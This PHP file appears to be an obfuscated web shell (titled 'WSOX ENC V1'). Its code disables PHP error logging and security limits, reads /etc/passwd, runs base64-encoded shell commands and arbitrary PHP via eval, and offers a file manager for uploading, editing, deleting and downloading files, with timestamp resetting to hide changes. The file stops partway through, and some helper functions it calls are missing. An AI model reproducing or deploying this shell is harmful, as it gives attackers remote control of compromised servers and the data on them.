<?php
if (@function_exists("ini_restore")) {
	@ini_restore("log_errors");
	@ini_restore("error_log");
	@ini_restore("error_reporting");
	@ini_restore("disable_function");
}
if (@function_exists("ini_set")) {
	@ini_set("log_errors_max_len", (int) round(0 + 0));
	@ini_set("error_log", null);
	@ini_set("log_errors", -0565 - 044 + 0631);
	@ini_set("max_execution_time", (int) round(0 + 0));
	@ini_set("memory_limit", "1000M");
	@ini_set("file_uploads", -042 + -05 + 050);
	@ini_set("safe_mode", 01227 + -0331 + -0676);
	@ini_set("open_basedir", null);
	@ini_set("safe_mode_exec_dir", "");
	@ini_set("disable_function", "");
}
if (@function_exists("set_magic_quotes_runtime")) {
	if (version_compare(phpversion(), "5.4.0", "<")) {
		magic_quotes_runtime(0565 + -0630 + 043);
	}
}
class _uc
{
	public $hsh;
	public $_bve;
	public $_idu;
	public $_asv;
	public $_bvx;
	public $_zb;
	public $_y;
	public $_ahs;
	public $_v;
	public $_a;
	public $_r = [];
	public $_z = [];
	function _jk($_aw, $_lbm)
	{
		$_COOKIE[$_aw] = $_lbm;
		@setcookie($_aw, $_lbm);
	}
	function _gz()
	{
		$this->hsh = "4695c3f6beb7658b";
		$this->_bve =
			"_" .
			substr(
				md5($_SERVER["HTTP_HOST"]),
				-0103 + 034 - -047,
				-030 + 033
			);
		$this->_idu = "#df5";
		$this->_asv = "UTF-8";
	}
	function _ry()
	{
		if (@function_exists("ini_get")) {
			$_v = @ini_get("safe_mode");
			$_bvx = @ini_get("disable_functions");
		}
		if (!$_v && @function_exists("error_reporting")) {
			error_reporting((int) round(0 + 0));
		}
		if (!$_v && @function_exists("set_time_limit")) {
			set_time_limit(022 + 0374 - 0416);
		}
		if (!$_v && @function_exists("ignore_user_abort")) {
			ignore_user_abort(true);
		}
		if (
			@function_exists("get_magic_quotes_gpc") &&
			@function_exists("stripslashes")
		) {
			if (@get_magic_quotes_gpc()) {
				function _wn($_k)
				{
					foreach ($_k as $_aw => $_lbm) {
						if (is_array($_lbm)) {
							$_k[$_aw] = _wn($_lbm);
						} else {
							$_k[$_aw] = stripslashes($_lbm);
						}
					}
					return $_k;
				}
				$_GET = _wn($_GET);
				$_POST = _wn($_POST);
				$_COOKIE = _wn($_COOKIE);
			}
		}
		define("PE", @function_exists("posix_geteuid"));
		define(
			"WI",
			strtolower(
				substr(PHP_OS, 01467 + -01343 + -0124, (int) round(1 + 1 + 1))
			) == "win"
		);
		if (
			strtolower(
				substr(PHP_OS, (int) round(0 + 0 + 0), (int) round(1 + 1 + 1))
			) == "win"
		) {
			$_a = "win";
		} else {
			$_a = "nix";
		}
		if (!PE && !WI) {
			if (@is_readable("/etc/passwd")) {
				$_yhd = file("/etc/passwd");
				foreach ($_yhd as $_lbm) {
					$_lbm = explode(":", $_lbm);
					$_r[$_lbm[01044 + 0350 - 01412]] = $_lbm[00 - 00];
				}
			}
			if (@is_readable("/etc/group")) {
				$_yhd = file("/etc/group");
				foreach ($_yhd as $_lbm) {
					$_lbm = explode(":", $_lbm);
					$_z[
						$_lbm[
							(int) round(
								0.66666666666667 +
									0.66666666666667 +
									0.66666666666667
							)
						]
					] = $_lbm[(int) round(0 + 0)];
				}
			}
		}
		$_ahs = $_SERVER["DOCUMENT_ROOT"];
		if (@function_exists("getcwd")) {
			$_y = @getcwd();
		} else {
			$_y = @dirname(__FILE__);
		}
		if (isset($_POST["c"]) && $_POST["c"] != "") {
			$_POST["c"] = str_rot13($_POST["c"]);
		}
		if (isset($_POST["c"])) {
			if (@function_exists("chdir")) {
				@chdir($_POST["c"]);
			}
		}
		if (@function_exists("getcwd")) {
			$_zb = @getcwd();
		} elseif (isset($_POST["c"]) && $_POST["c"] != "") {
			$_zb = $_POST["c"];
		} else {
			$_zb = $_y;
		}
		if ($_a == "win") {
			$_y = str_replace("\134", "/", $_y);
			$_zb = str_replace("\134", "/", $_zb);
		}
		if ($_zb[strlen($_zb) - (int) round(0.5 + 0.5)] != "/") {
			$_zb .= "/";
		}
		$this->_bvx = $_bvx;
		$this->_zb = $_zb;
		$this->_y = $_y;
		$this->_ahs = $_ahs;
		$this->_v = $_v;
		$this->_a = $_a;
	}
	function _vi()
	{
		if (!empty($_POST["p"])) {
			$_POST["p"] = @base64_decode($_POST["p"]);
		}
		if (!empty($_POST["p"]) && !empty($_POST["x"])) {
			$this->_jk("_sto", true);
			$_POST["p"] .= " 2>&1";
		} elseif (!empty($_POST["p"])) {
			$this->_jk("_sto", -0701 - 0176 - -01077);
		}
		echo "<script>if(window.Event) window.captureEvents(Event.KEYDOWN);var cmds=new Array('');var cur=0;function kp(e){var n=(window.Event) ? e.which : e.keyCode;if(n==38){cur--;if(cur>=0)document.cf.cmd.value=cmds[cur];elsecur++;}else if(n==40){cur++;if(cur < cmds.length)document.cf.cmd.value=cmds[cur];elsecur--;}}function add(cmd){cmds.pop();cmds.push(cmd);cmds.push('');cur=cmds.length-1;}</script>";
		echo "<h1>Exec</h1><div class=content><form name=cf onsubmit=\042if(d.cf.cmd.value=='clear'){d.cf.output.value='';d.cf.cmd.value='\x27;return false;}add(this.cmd.value);g(null,null,utoa(this.cmd.value),this.show_errors.checked?1:\047\x27);return false;\x22>";
		echo "<input type=checkbox name=show_errors value=1 " .
			(!empty($_POST["x"]) || $_COOKIE["_sto"]
				? "checked"
				: "") .
			"> redirect stderr to stdout (2>&1)</nobr><br/><textarea id=taid class=bigarea name=output style=\x22border-bottom:0;margin:0;\x22 readonly>";
		if (!empty($_POST["p"])) {
			if (!empty($_SESSION["ex"])) {
				echo $_SESSION["ex"];
			}
			$_vqu = _lqyw(
				"$ " .
					$_POST["p"] .
					" " .
					_bjab($_POST["p"]) .
					"  "
			);
			echo $_vqu;
			$_SESSION["ex"] = $_SESSION["ex"] . $_vqu;
		} else {
			unset($_SESSION["ex"]);
		}
		echo "</textarea><table style=\042border:1px solid #df5;background-color:#555;border-top:0px;\042 cellpadding=0 cellspacing=0 width=\042100%\x22><tr><td width=\0421%\042>$</td><td><input type=text name=cmd style=\042border:0px;width:100%;\042 onkeydown=\x22kp(event);\042></td></tr></table></form></div><script>d.cf.cmd.focus(); var textar = document.getElementById(\042taid\x22); textar.scrollTop = textar.scrollHeight;</script>";
	}
	function _ksdl()
	{
		echo "<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\042g('ph',null,utoa(this.code.value),'');return false;\x22><textarea name=code class=bigarea id=PhpCode>" .
			(!empty($_POST["p"]) ? _lqyw(@base64_decode($_POST["p"])) : "") .
			"</textarea><input type=submit value=Eval style=\042margin-top:5px\x22>";
		echo "</form><pre id=PhpOutput style=\042" .
			(empty($_POST["p"]) ? "display:none;" : "") .
			"margin-top:5px;\x22 class=ml1>";
		if (!empty($_POST["p"])) {
			@ob_start();
			eval(@base64_decode($_POST["p"]));
			echo _lqyw(ob_get_clean());
		}
		echo "</pre></div>";
	}
	function _jaq()
	{
		echo "<h1>PHP Info</h1><div class=content>";
		@ob_start();
		@phpinfo();
		$_pn = str_replace("<img ", "<noimg ", @ob_get_clean());
		$_xe = substr($_pn, strpos($_pn, "<style"));
		$_xe =
			substr($_xe, -016 + 016, strpos($_xe, "</style>")) .
			", p, table, th, td {font-size:12px}</style>";
		$_xe = str_replace(
			["body", " ", ","],
			["p", " .php ", ", .php "],
			$_xe
		);
		$_xe = @preg_replace(
			"/\134bbackground-color\134b: #[^;]+?;\x5cs*/",
			"",
			$_xe
		);
		$_xe = @preg_replace(
			"/\134bcolor\134b: #[^;]+?;\134s*/",
			"",
			$_xe
		);
		$_pn = substr(
			$_pn,
			strpos($_pn, "<body>") + (-0453 + 074 - -0365)
		);
		$_pn = substr($_pn, 060 - 060, strrpos($_pn, "</body>"));
		$_pn = @preg_replace(
			"/<h1>PHP Credits<\134/h1>.+/ms",
			"",
			$_pn
		);
		echo "<div class=\x22php\x22>", $_xe, $_pn, "</div>";
		echo "</div>";
	}
	function _eg()
	{
		$_zb = $this->_zb;
		if (!empty($_POST["p"])) {
			$_qr = @filemtime($_POST["c"]);
			switch ($_POST["p"]) {
				case "uploadFile":
				case "uf":
					if (
						!@move_uploaded_file(
							$_FILES["f"]["tmp_name"],
							$_FILES["f"]["name"]
						)
					) {
						echo "Can't upload file!";
					} elseif ($_qr) {
						@touch($_FILES["f"]["name"], $_qr, $_qr);
					}
					break;
				case "mkdir":
				case "md":
					if (!@mkdir(str_rot13($_POST["x"]))) {
						echo "Can't create new dir";
					} elseif ($_qr) {
						@touch(str_rot13($_POST["x"]), $_qr, $_qr);
					}
					break;
				case "delete":
				case "de":
					function _mt($_atj)
					{
						$_atj =
							substr($_atj, -(-017 - -020)) == "/"
								? $_atj
								: $_atj . "/";
						if ($_b = @opendir($_atj)) {
							while (($_f = @readdir($_b)) !== false) {
								$_f = $_atj . $_f;
								if (
									@basename($_f) == ".." ||
									@basename($_f) == "."
								) {
									continue;
								}
								$_gyx = @filetype($_f);
								if ($_gyx == "dir") {
									_mt($_f);
								} else {
									@unlink($_f);
								}
							}
							@closedir($_b);
						}
						@rmdir($_atj);
					}
					if (@is_array($_POST["f"])) {
						foreach ($_POST["f"] as $_egw) {
							if ($_egw == "..") {
								continue;
							}
							$_egw = str_rot13(urldecode($_egw));
							if (@is_dir($_egw)) {
								_mt($_egw);
							} else {
								@unlink($_egw);
							}
						};
					}
					break;
			}
			if ($_qr) {
				touch($_POST["c"], $_qr, $_qr);
			}
		}
		echo "<h1>File manager</h1><div class=content><script>p_=x_=s_=\042\x22;</script>";
		$_gn = _zhpf(isset($_POST["c"]) ? $_POST["c"] : $_zb);
		if ($_gn === false) {
			echo "Can't open this folder!";
			return;
		}
		global $_q;
		$_q = ["name", 0223 - 0222];
		if (!empty($_POST["p"])) {
			if (
				@preg_match(
					"!s_([A-z]+)_(\134d{1})!",
					$_POST["p"],
					$_oat
				)
			) {
				$_q = [
					$_oat[0304 + -0303],
					(int) $_oat[
						(int) round(
							0.66666666666667 +
								0.66666666666667 +
								0.66666666666667
						)
					],
				];
			}
		}
		echo "<script>function sa(){for(i=0;i<d.files.elements.length;i++)if(d.files.elements[i].type=='checkbox')d.files.elements[i].checked=d.files.elements[0].checked;}</script><table width='100%' class='main\047 cellspacing='0' cellpadding='2'><form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th width=\x2740%'><a href='#' onclick='g(\x22fm\042,null,\x22s_name_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0 + 0)
				: 0357 + -0356) .
			"\x22)\x27>Name</a></th><th><a href=\047#' onclick='g(\042fm\x22,null,\x22s_size_" .
			($_q[0123 + -0122] ? (int) round(0 + 0) : 01643 + -01642) .
			"\x22)'>Size</a></th><th><a href='#' onclick='g(\042fm\042,null,\x22s_modify_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0)
				: 00 - 010 - -011) .
			"\x22)'>Modify</a></th><th><a href='#' onclick='g(\042fm\042,null,\042s_perms_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0)
				: (int) round(0.5 + 0.5)) .
			"\042)'>Permissions</a></th><th width='200px'>Actions</th></tr>";
		$_s = $_une = [];
		$_zmj = count($_gn);
		for ($_ox = 0471 - 0471; $_ox < $_zmj; $_ox++) {
			$_jk = [
				"name" => $_gn[$_ox],
				"path" => $_zb . $_gn[$_ox],
				"modify" => @date(
					"Y-m-d H:i:s",
					@filemtime($_zb . $_gn[$_ox])
				),
				"perms" => _bkcv($_zb . $_gn[$_ox]),
				"size" => @filesize($_zb . $_gn[$_ox]),
			];
			if (@is_file($_zb . $_gn[$_ox])) {
				$_une[] = @array_merge($_jk, ["type" => "file"]);
			} elseif (@is_link($_zb . $_gn[$_ox])) {
				$_s[] = @array_merge($_jk, [
					"type" => "link",
					"link" => readlink($_jk["path"]),
				]);
			} elseif (@is_dir($_zb . $_gn[$_ox])) {
				$_s[] = @array_merge($_jk, ["type" => "dir"]);
			}
		}
		function _xv($_yhd, $_mtv)
		{
			global $_q;
			if ($_q[(int) round(0 + 0)] != "size") {
				return @strcmp(
					strtolower($_yhd[$_q[(int) round(0 + 0 + 0)]]),
					strtolower($_mtv[$_q[-065 + -013 - -0100]])
				) *
					($_q[
						(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						)
					]
						? (int) round(0.5 + 0.5)
						: -(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						));
			} else {
				return ($_yhd["size"] < $_mtv["size"]
					? -(-027 - -0113 + -063)
					: -01146 - -01147) *
					($_q[(int) round(0.5 + 0.5)]
						? (int) round(0.5 + 0.5)
						: -(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						));
			}
		}
		@usort($_une, "wCmp");
		@usort($_s, "wCmp");
		$_une = @array_merge($_s, $_une);
		$_pao = (int) round(0 + 0 + 0);
		foreach ($_une as $_egw) {
			$_hzu = str_rot13(urlencode($_egw["name"]));
			echo "<tr" .
				($_pao ? " class=l1" : "") .
				"><td><input type=checkbox name=\x22f[]\x22 value=\042" .
				$_hzu .
				"\042 class=chkbx></td><td><a href=# onclick=\x22" .
				($_egw["type"] == "file"
					? "g('ft',null,'" .
						$_hzu .
						"', 'view')\x22>" .
						_lqyw($_egw["name"])
					: "g('fm','" .
						str_rot13($_egw["path"]) .
						"\x27);\x22 " .
						(empty($_egw["link"])
							? ""
							: "title='" . $_egw["link"] . "'") .
						"><b>[ " .
						_lqyw($_egw["name"]) .
						" ]</b>") .
				"</a></td><td>" .
				($_egw["type"] == "file"
					? _xkmo($_egw["size"])
					: $_egw["type"]) .
				"</td><td>" .
				$_egw["modify"] .
				"</td><td><a href=# onclick=\042g('ft',null,'" .
				$_hzu .
				"','chmod')\x22>" .
				$_egw["perms"] .
				"</td><td><a href=\042#\x22 onclick=\x22g('ft',null,\047" .
				$_hzu .
				"\x27, 'rename')\042>Rename</a> <a href=\x22#\042 onclick=\x22g(\x27ft',null,'" .
				$_hzu .
				"', 'touch')\x22>Touch</a>" .
				($_egw["type"] == "file"
					? " <a href=\042#\x22 onclick=\042g('ft',null,'" .
						$_hzu .
						"', 'edit')\042>Edit</a> <a href=\042#\042 onclick=\x22g('ft',null,'" .
						$_hzu .
						"', 'dl')\x22>Download</a>"
					: "") .
				"</td></tr>";
			$_pao = $_pao
				? -0522 + 052 - -0450
				: (int) round(
					0.33333333333333 + 0.33333333333333 + 0.33333333333333
				);
		}
		echo "<tr><td colspan=7>    <input type=hidden name=a value='fm'>    <input type=hidden name=c value='" .
			_lqyw(str_rot13($_zb)) .
			"'>    <input type=hidden name=ch value=\x27" .
			(isset($_POST["ch"]) ? $_POST["ch"] : "") .
			"\x27>    <select name='p'><option value='de\047>Delete</option></select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>";
	}
	function _ng()
	{
		if (isset($_POST["p"])) {
			$_POST["p"] = str_rot13(urldecode($_POST["p"]));
		}
		if (isset($_POST["x"])) {
			switch ($_POST["x"]) {
				case "download":
				case "dl":
					if (@is_file($_POST["p"]) && @is_readable($_POST["p"])) {
						@ob_start("ob_gzhandler", 010314 - 07701 + 07365);
						@header(
							"Content-Disposition: attachment; filename=" .
								@basename($_POST["p"])
						);
						if (@function_exists("mime_content_type")) {
							$_gyx = @mime_content_type($_POST["p"]);
							@header("Content-Type: " . $_gyx);
						} else {
							@header(
								"Content-Type: application/octet-stream"
							);
						}
						$_op = @fopen($_POST["p"], "r");
						if ($_op) {
							while (!@feof($_op)) {
								echo @fgets($_op, (int) round(512 + 512));
							}
							@fclose($_op);
						}
					}
					exit();
					break;
				case "mkfile":
					if (!@file_exists($_POST["p"])) {
						$_d = @filemtime($_POST["c"]);
						$_op = @fopen($_POST["p"], "w");
						if ($_op) {
							@fclose($_op);
							if ($_d) {
								@touch($_POST["c"], $_d, $_d);
								@touch($_POST["p"], $_d, $_d);
							}
							$_POST["x"] = "edit";
						}
					}
					break;
			}
		}
		echo "<h1>File tools</h1><div class=content>";
		if (!@file_exists($_POST["p"])) {
			echo "File not exists";
			return;
		}
		$_dvm = @stat($_POST["p"]);
		if (PE) {
			$_ya = @posix_getpwuid(
				$_tcg[
					(int) round(
						1.3333333333333 + 1.3333333333333 + 1.3333333333333
					)
				]
			);
			$_dzf = $_ya["name"];
		} elseif (!empty($_r[$_dvm[-01056 - -01062]])) {
			$_dzf = $_r[$_dvm[0753 + 056 - 01025]];
		} else {
			$_dzf = $_dvm[(int) round(2 + 2)];
		}
		if (PE) {
			$_ya = @posix_getgrgid($_dvm[-0717 + 0724]);
			$_cpq = $_ya["name"];
		} elseif (!empty($_z[$_dvm[0752 - -01124 + -02071]])) {
			$_cpq = $_z[$_dvm[-067 + 0237 + -0143]];
		} else {
			$_cpq = $_dvm[024 - 017];
		}
		echo "<span>Name:</span> " .
			_lqyw(@basename($_POST["p"])) .
			" <span>Size:</span> " .
			(@is_file($_POST["p"]) ? _xkmo(@filesize($_POST["p"])) : "-") .
			" <span>Permission:</span> " .
			_bkcv($_POST["p"]) .
			" <span>Owner/Group:</span> " .
			$_dzf .
			"/" .
			$_cpq .
			"<br>";
		echo "<span>Change time:</span> " .
			@date("Y-m-d H:i:s", @filectime($_POST["p"])) .
			" <span>Access time:</span> " .
			@date("Y-m-d H:i:s", @fileatime($_POST["p"])) .
			" <span>\115odify time:</span> " .
			@date("Y-m-d H:i:s", @filemtime($_POST["p"])) .
			"<br><br>";
		if (empty($_POST["x"])) {
			$_POST["x"] = "view";
		}
		if (@is_file($_POST["p"])) {
			$_j = [
				"View",
				"Download",
				"Edit",
				"Chmod",
				"Rename",
				"Touch",
			];
		} else {
			$_j = ["Chmod", "Rename", "Touch"];
		}
		foreach ($_j as $_lbm) {
			echo "<a href=# onclick=\042g(null,null,'" .
				urlencode(str_rot13($_POST["p"])) .
				"','" .
				@strtolower($_lbm) .
				"')\042>" .
				(@strtolower($_lbm) == $_POST["x"]
					? "<b>[ " . $_lbm . " ]</b>"
					: $_lbm) .
				"</a> ";
		}
		echo "<br><br>";
		switch ($_POST["x"]) {
			case "view":
			case "vw":
				echo "<pre class=ml1>";
				$_op = @fopen($_POST["p"], "r");
				if ($_op) {
					while (!@feof($_op)) {
						echo _lqyw(
							@fgets(
								$_op,
								(int) round(
									341.33333333333 +
										341.33333333333 +
										341.33333333333
								)
							)
						);
					}
					@fclose($_op);
				}
				echo "</pre>";
				break;
			case "chmod":
			case "cm":
				if (!empty($_POST["s"])) {
					$_yx = (int) round(0 + 0);
					for (
						$_ox =
							strlen($_POST["s"]) -
							(int) round(
								0.33333333333333 +
									0.33333333333333 +
									0.33333333333333
							);
						$_ox >= (int) round(0 + 0);
						--$_ox
					) {
						$_yx +=
							(int) $_POST["s"][$_ox] *
							@pow(
								(int) round(4 + 4),
								strlen($_POST["s"]) -
									$_ox -
									(0246 + -047 - 0176)
							);
					}
					if (!@chmod($_POST["p"], $_yx)) {
						echo "Can't set permissions!<br><script>document.mf.s.value=\042\x22;</script>";
					}
				}
				@clearstatcache();
				echo "<script>s_=\042\042;</script><form onsubmit=\x22g(null,null,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',null,this.chmod.value);return false;\042><input type=text name=chmod value=\042" .
					substr(
						@sprintf("%o", @fileperms($_POST["p"])),
						-(int) round(2 + 2)
					) .
					"\x22><input type=submit value=\042>>\x22></form>";
				break;
			case "edit":
			case "ed":
				if (!@is_writable($_POST["p"])) {
					echo "File isn't writeable";
					break;
				}
				if (!empty($_POST["s"])) {
					$_qr = @filemtime($_POST["p"]);
					$_POST["s"] = substr(
						$_POST["s"],
						01404 + -0310 + -01073
					);
					$_POST["s"] = @base64_decode($_POST["s"]);
					$_op = @fopen($_POST["p"], "w");
					if ($_op) {
						@fputs($_op, $_POST["s"]);
						@fclose($_op);
						echo "Saved!<br><script>s_=\042\042;</script>";
					}
				}
				echo "<form onsubmit=\x22g(null,null,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',\x27edit','1'+utoa(this.text.value));return false;\x22><textarea name=text class=bigarea>";
				$_op = @fopen($_POST["p"], "r");
				if ($_op) {
					while (!@feof($_op)) {
						echo _lqyw(@fgets($_op, (int) round(512 + 512)));
					}
					@fclose($_op);
				}
				echo "</textarea><input type=submit value=\042Save\x22></form>";
				if ($_qr) {
					@touch($_POST["p"], $_qr, $_qr);
				}
				@clearstatcache();
				break;
			case "rename":
			case "rn":
				$_d = @filemtime($_POST["c"]);
				if (!empty($_POST["s"])) {
					if (!@rename($_POST["p"], str_rot13($_POST["s"]))) {
						echo "Can't rename!<br>";
					} else {
						if ($_d) {
							@touch($_POST["c"], $_d, $_d);
						}
						die(
							"<script>g(null,null,\042" .
								urlencode($_POST["s"]) .
								"\x22,null,\042\x22)</script>"
						);
					}
				}
				@clearstatcache();
				echo "<form onsubmit=\042g(null,null,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',null,rot13(this.name.value));return false;\x22><input type=text name=name value=\042" .
					_lqyw($_POST["p"]) .
					"\x22><input type=submit value=\042>>\x22></form>";
				break;
			case "touch":
			case "tc":
				if (!empty($_POST["s"])) {
					$_qr = @strtotime($_POST["s"]);
					if ($_qr) {
						if (!@touch($_POST["p"], $_qr, $_qr)) {
							echo "Fail!";
						} else {
							echo "Touched!";
						}
					} else {
						echo "Bad time format!";
					}
				}
				@clearstatcache();
				echo "<script>s_=\042\042;</script><form onsubmit=\042g(null,null,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',null,this.touch.value);return false;\042><input type=text name=touch value=\042" .
					@date("Y-m-d H:i:s", @filemtime($_POST["p"])) .
					"\x22><input type=submit value=\x22>>\x22></form>";
				break;
		}
		echo "</div>";
	}
	function _ds()
	{
		$_idu = $this->_idu;
		$_asv = $this->_asv;
		$_zb = $this->_zb;
		$_y = $this->_y;
		$_ahs = $this->_ahs;
		$_bve = $this->_bve;
		$_v = $this->_v;
		$_a = $this->_a;
		if (empty($_POST["ch"])) {
			$_POST["ch"] = $_asv;
		}
		@header(
			"Content-Type: text/html; charset=" . $_POST["ch"]
		);
		echo "<html><head><meta http-equiv='Content-Type' content=\047text/html; charset=" .
			$_POST["ch"] .
			"\047><title>" .
			$_SERVER["HTTP_HOST"] .
			" - WSOX ENC V1</title>    <style>body{background-color:#444;color:#e1e1e1;}body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: " .
			$_idu .
			" !important;}span{font-weight: bolder;}span.wfw{font-weight:normal;}h1{border-left:5px solid " .
			$_idu .
			";padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;}a{text-decoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}.bigarea{width:100%;height:400px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid " .
			$_idu .
			"; font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.toolsInp{width:500px}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-color:#333}pre{font-family:Courier,Monospace;}</style>  <script>  var c_ = '" .
			_lqyw(str_rot13($_zb)) .
			"';  var a_ = '" .
			_lqyw($_POST["a"]) .
			"'  var ch_ = '" .
			_lqyw($_POST["ch"]) .
			"';  var p_ = '" .
			(strpos($_POST["p"], " ") !== false
				? ""
				: _lqyw($_POST["p"], -064 - -067)) .
			"';  var x_ = '" .
			(strpos($_POST["x"], " ") !== false
				? ""
				: _lqyw($_POST["x"], -0245 - -0250)) .
			"';  var s_ = '" .
			(strpos($_POST["s"], " ") !== false
				? ""
				: _lqyw($_POST["s"], (int) round(1.5 + 1.5))) .
			"\047;  var d = document;  function set(a,c,p,x,s,ch){if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;}function g(a,c,p,x,s,ch){set(a,c,p,x,s,ch);d.mf.submit();}function utoa(str){return window.btoa(unescape(encodeURIComponent(str)));}function atou(str){return decodeURIComponent(escape(window.atob(str)));}function rot13(str){var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var output='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; var index=x=> input.indexOf(x); var translate=x=> index(x) > -1 ? output[index(x)] : x; return str.split('\x27).map(translate).join('\047);}var cvis=false;function show(){if(!cvis){document.getElementById('bat').innerHTML=\047Links';document.getElementById('cwd').style.display='inline';document.getElementById('links').style.display='none';cvis=true;}else{document.getElementById('bat').innerHTML='Text\x27;document.getElementById('cwd').style.display='none';document.getElementById('links').style.display='inline';cvis=false;}}  </script>  </head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>  <form method=post name=mf style=\047display:none;'>  <input type=hidden name=a>  <input type=hidden name=c>  <input type=hidden name=p>  <input type=hidden name=x>  <input type=hidden name=s>  <input type=hidden name=ch>  </form>";
		if (@function_exists("diskfreespace")) {
			$_i = @diskfreespace($_zb);
		}
		if (@function_exists("disk_total_space")) {
			$_pmf = @disk_total_space($_zb);
		}
		$_pmf = $_pmf ? $_pmf : -061 - -062;
		if (@function_exists("php_uname")) {
			$_ea = @php_uname();
		} elseif (@function_exists("phpinfo")) {
			@ob_start();
			phpinfo();
			$_flj = @ob_get_clean();
			if (
				false !==
				@preg_match(
					"!<tr><td class=\x22e\x22>System\134s*</td><td class=\042v\x22>([^\134<]+)!i",
					$_flj,
					$_fuf
				)
			) {
				$_ea = trim($_fuf[(int) round(0.5 + 0.5)]);
			}
		}
		if (
			@function_exists("posix_getpwuid") &&
			@function_exists("posix_geteuid") &&
			@function_exists("posix_getgrgid") &&
			@function_exists("posix_getegid")
		) {
			$_dzf = @posix_getpwuid(@posix_geteuid());
			$_cpq = @posix_getgrgid(@posix_getegid());
			$_e = $_dzf["name"];
			$_dzf = $_dzf["uid"];
			$_edo = $_cpq["name"];
			$_cpq = $_cpq["gid"];
		} else {
			if (@function_exists("get_current_user")) {
				$_e = @get_current_user();
			}
			if (@function_exists("getmyuid")) {
				$_dzf = @getmyuid();
			}
			if (@function_exists("getmygid")) {
				$_cpq = @getmygid();
			}
			$_edo = "?";
		}
		if (
			@function_exists("mb_detect_encoding") &&
			@function_exists("iconv")
		) {
			if (@mb_detect_encoding($_e, "Windows-1251")) {
				$_e = @iconv("Windows-1251", "UTF-8", $_e);
			}
		}
		$_g = "";
		$_atj = @explode("/", $_zb);
		$_zmj = count($_atj);
		for ($_ox = 065 + -065; $_ox < $_zmj - (024 + 0104 + -0127); $_ox++) {
			$_g .= "<a href='#' onclick='g(\x22fm\042,\042";
			for ($_oyj = (int) round(0 + 0 + 0); $_oyj <= $_ox; $_oyj++) {
				$_g .= str_rot13($_atj[$_oyj]) . "/";
			}
			$_g .= "\x22,\042\x22,\x22\x22)'>" . $_atj[$_ox] . "/</a>";
		}
		$_srb = ["UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866"];
		$_h = "";
		foreach ($_srb as $_f) {
			$_h .=
				"<option value=\042" .
				$_f .
				"\x22 " .
				($_POST["ch"] == $_f ? "selected" : "") .
				">" .
				$_f .
				"</option>";
		}
		$_j = [
			"PHP Info" => "pi",
			"Files" => "fm",
			"Exec" => "ce",
			"Eval" => "ph",
		];
		$_su = "";
		foreach ($_j as $_aw => $_lbm) {
			$_su .=
				"<th width=\x22" .
				(int) ((int) round(
					33.333333333333 + 33.333333333333 + 33.333333333333
				) / count($_j)) .
				"%\042>[ <a href=\042#\042 onclick=\x22g('" .
				$_lbm .
				"',null,\047','','')\042>" .
				$_aw .
				"</a> ]</th>";
		}
		$_xc = "";
		if ($_a == "win") {
			foreach (@range("c", "z") as $_cw) {
				if (@is_dir($_cw . ":\x5c")) {
					$_xc .=
						"<a href=\x22#\042 onclick=\042g('fm\047,'" .
						str_rot13($_cw) .
						":/')\x22>[ " .
						$_cw .
						" ]</a> ";
				}
			}
		}
		$_ja = $_SERVER["SERVER_ADDR"];
		if (empty($_ja)) {
			$_ja = @gethostbyname($_SERVER["SERVER_NAME"]);
		}
		echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:" .
			($_a == "win" ? "<br>Drives:" : "") .
			"</span></td>" .
			"<td><nobr>" .
			($_ea
				? substr($_ea, (int) round(0 + 0), (int) round(40 + 40 + 40))
				: "N/A") .
			"</nobr><br>" .
			$_dzf .
			" ( " .
			$_e .
			" ) <span>Group:</span> " .
			$_cpq .
			" ( " .
			$_edo .
			" )<br>" .
			@phpversion() .
			" " .
			@preg_replace(
				"# .+$#",
				"",
				$_SERVER["SERVER_SOFTWARE"]
			) .
			" <span>Safe mode:</span> " .
			($_v
				? "<font color=red>ON</font>"
				: "<font color=green><b>OFF</b></font>") .
			" <span>Datetime:</span> " .
			date("Y-m-d H:i:s") .
			"<br>" .
			($_pmf ? _xkmo($_pmf) : "") .
			" <span>Free:</span> " .
			($_i ? _xkmo($_i) : "") .
			" (" .
			($_i && $_pmf
				? (int) (($_i / $_pmf) *
					(int) round(
						33.333333333333 + 33.333333333333 + 33.333333333333
					))
				: "0") .
			"%)<br><span id=\x22links\x22 class=\042wfw\x22>" .
			$_g .
			" " .
			_bkcv($_zb) .
			" <a href=# onclick=\042g('fm\047,\047" .
			str_rot13($_ahs) .
